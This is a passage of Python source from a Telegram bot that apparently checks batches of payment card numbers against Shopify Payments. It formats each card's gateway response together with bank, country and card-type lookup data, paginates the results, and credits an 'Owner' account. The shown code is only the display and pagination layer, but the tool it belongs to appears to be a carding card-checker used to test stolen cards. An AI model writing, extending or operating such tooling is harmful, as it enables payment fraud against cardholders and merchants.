        # Mid-progress / no results yet
        parts: list[str] = [
            f"{_bolt} <b>CHECKING...</b>",
            f"{_bolt} <b>Time ➛</b> <code>{elapsed}s</code>",
            f"{_star} <b>User ➛</b> {_user_tag()}",
            _dev_line,
        ]
        return "\n".join(parts)

    parts = []
    for res in page_results:
        safe_card = html.escape(res.get("card", ""))
        safe_resp = html.escape(res.get("resp", "UNKNOWN"))
        bin_full  = res.get("_bin_full", {}) or {}

        sym = res.get("symbol", "")
        bank    = html.escape(bin_full.get("bank") or "Unknown")
        country = html.escape(bin_full.get("country") or "Unknown")
        flag    = bin_full.get("country_emoji", "") or ""
        scheme  = html.escape(bin_full.get("scheme") or bin_full.get("brand") or "Unknown")
        card_type = html.escape(bin_full.get("type") or "Unknown")

        country_display = f"{country} {flag}" if flag else country
        type_display = f"{scheme} · {card_type}" if scheme != "Unknown" or card_type != "Unknown" else "Unknown"

        # Status banner inside box (first word of response in caps)
        status_word = safe_resp.upper().replace("_", " ")
        if not status_word:
            status_word = "RESULT"

        parts.extend([
            box_top,
            f"      {sym} <b>{status_word}</b> {sym}",
            box_bottom,
            "",
            f"<tg-emoji emoji-id=\"5269501182258205420\">💳</tg-emoji> <b>Card ➛</b> <code>{safe_card}</code>",
            f"<tg-emoji emoji-id=\"6147670059822092505\">🏪</tg-emoji> <b>Gateway ➛</b> Shopify Payments",
            f"<tg-emoji emoji-id=\"5388849303982716989\">📨</tg-emoji> <b>Response ➛</b> <code>{safe_resp}</code>",
            _divider,
            f"<tg-emoji emoji-id=\"5922478782689579227\">🏦</tg-emoji> <b>Bank ➛</b> {bank}",
            f"<tg-emoji emoji-id=\"5350835008007324644\">🌍</tg-emoji> <b>Country ➛</b> {country_display}",
            f"<tg-emoji emoji-id=\"5350572310627632617\">💳</tg-emoji> <b>Type ➛</b> {type_display}",
            _divider,
            f"<tg-emoji emoji-id=\"4904882772637648609\">⏱</tg-emoji> <b>Time ➛</b> <code>{elapsed}s</code>",
            f"<tg-emoji emoji-id=\"5433641741251011862\">👤</tg-emoji> <b>User ➛</b> {_user_tag()}",
            f"<tg-emoji emoji-id=\"5397981293512243749\">🐉</tg-emoji> <b>Owner ➛</b> <a href=\"https://t.me/Im_in_so_love\"><b>Rukia</b></a>",
        ])

    return "\n".join(parts)


def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = SH_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages = (total + 5) // 6
    current = state["page"]

    row = []
    if current > 0:
        row.append(InlineKeyboardButton(text="◀ Back", callback_data=f"sh_prev_{msg_id}", icon_custom_emoji_id=EMOJI_RED_TICK))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next ▶", callback_data=f"sh_next_{msg_id}", icon_custom_emoji_id=EMOJI_DRAGON))

    return InlineKeyboardMarkup(inline_keyboard=[row]) if row else None


@router.callback_query(F.data.startswith("sh_"))
async def sh_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        return
    try:
        msg_id = int(parts[2])
    except (ValueError, IndexError):
        return

    state = SH_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired.", show_alert=True)
        return

    if callback.from_user.id != state["user_id"]:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    await callback.answer()

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + 5) // 6

    if action == "next" and state["page"] < total_pages - 1:
        state["page"] += 1
    elif action == "prev" and state["page"] > 0:
        state["page"] -= 1

    elapsed = state.get("elapsed_final", round(time.time() - state["start_time"], 2))

    text = format_page_content(state, elapsed, is_working=False)
    _epic_glyph = f'<tg-emoji emoji-id="5397981293512243749">✨</tg-emoji>'
    _ok_glyph = f'<tg-emoji emoji-id="5310296284874159738">✅</tg-emoji>'
    if len(state["results"]) < state["total_cards"]:
        text += f"\n\n{_epic_glyph} <b>Checking {len(state['results'])}/{state['total_cards']}...</b>"
    else:
        text += f"\n\n{_ok_glyph} <b>Check Complete.</b> {_epic_glyph}"

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except Exception:
        pass
